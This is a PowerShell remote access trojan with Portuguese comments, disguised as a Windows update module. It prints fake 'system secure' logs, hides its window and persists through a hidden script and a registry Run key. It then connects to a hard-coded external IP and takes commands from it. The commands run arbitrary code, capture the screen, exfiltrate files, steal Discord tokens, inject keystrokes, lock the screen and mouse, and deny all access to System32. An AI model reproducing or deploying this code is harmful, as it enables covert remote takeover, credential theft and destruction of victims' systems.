<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { return "ERRO_AO_REMOVER" }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { return "ERRO_AO_LISTAR" }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { return $false }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

# ===== TELA PRETA =====
$global:blackScreenForm = $null

function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({
                if ($_.KeyCode -eq 'Escape') { $form.Close() }
            })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Invoke([Action]{ $_.Close() })
        }
        return "SCREEN_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE (VERSÃO SIMPLES E ROBUSTA) =====
$global:mouseLocked = $false
$global:lockThread = $null

function Lock-Mouse {
    try {
        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $global:mouseLocked = $true
        $global:lockThread = [System.Threading.Thread]::new({
            while ($global:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 5
                } catch {
                    # Ignora erros
                }
            }
        })
        $global:lockThread.IsBackground = $true
        $global:lockThread.Start()
        
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $global:mouseLocked = $false
        if ($global:lockThread -and $global:lockThread.IsAlive) {
            $global:lockThread.Abort()
        }
        return "MOUSE_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        return "AUDIO:OK"
    } catch {
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    return "WEBCAM:OK"
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { 
        return "POWER_ERROR" 
    }
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch {}
    attrib +h +s +r $scriptPath
}

if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            # Switch explícito sem wildcards para evitar confusão
            switch ($cmd) {
                "screenshot"          { $writer.WriteLine((Get-ScreenCapture)) }
                "click"               { $writer.WriteLine((Click-Mouse)) }
                "rightclick"          { $writer.WriteLine((RightClick-Mouse)) }
                "discord"             { $writer.WriteLine((Get-DiscordToken)) }
                "block_system32"      { $writer.WriteLine((Block-System32)) }
                "black_screen"        { $writer.WriteLine((Black-Screen)) }
                "unlock_screen"       { $writer.WriteLine((Unlock-Screen)) }
                "lock_mouse"          { $writer.WriteLine((Lock-Mouse)) }
                "unlock_mouse"        { $writer.WriteLine((Unlock-Mouse)) }
                "mic"                 { $writer.WriteLine((Get-Microphone)) }
                "webcam"              { $writer.WriteLine((Get-Webcam)) }
                "processes"           { $writer.WriteLine((Get-ProcessList)) }
                "shutdown"            { $writer.WriteLine((Power-Control "shutdown")) }
                "reboot"              { $writer.WriteLine((Power-Control "reboot")) }
                "list_users"          { $writer.WriteLine((Get-RATUsers)) }
                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
                "test"                { $writer.WriteLine("PONG") }
                "exit"                { break }
                default {
                    # Comandos com parâmetros usando regex
                    if ($cmd -match "^move (\d+) (\d+)$") {
                        $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
                    } elseif ($cmd -match "^key (.+)$") {
                        $writer.WriteLine((Send-Key $matches[1]))
                    } elseif ($cmd -match "^type (.+)$") {
                        $writer.WriteLine((Send-Text $matches[1]))
                    } elseif ($cmd -match "^ls (.+)$") {
                        $writer.WriteLine((Get-FileList $matches[1]))
                    } elseif ($cmd -match "^download (.+)$") {
                        $writer.WriteLine((Download-File $matches[1]))
                    } elseif ($cmd -match "^exec (.+)$") {
                        $writer.WriteLine((Execute-Command $matches[1]))
                    } elseif ($cmd -match "^url (.+)$") {
                        $writer.WriteLine((Open-Url $matches[1]))
                    } elseif ($cmd -match "^remove_user (.+)$") {
                        $writer.WriteLine((Remove-UserFromRAT $matches[1]))
                    } else {
                        $writer.WriteLine("Comando nao reconhecido")
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()

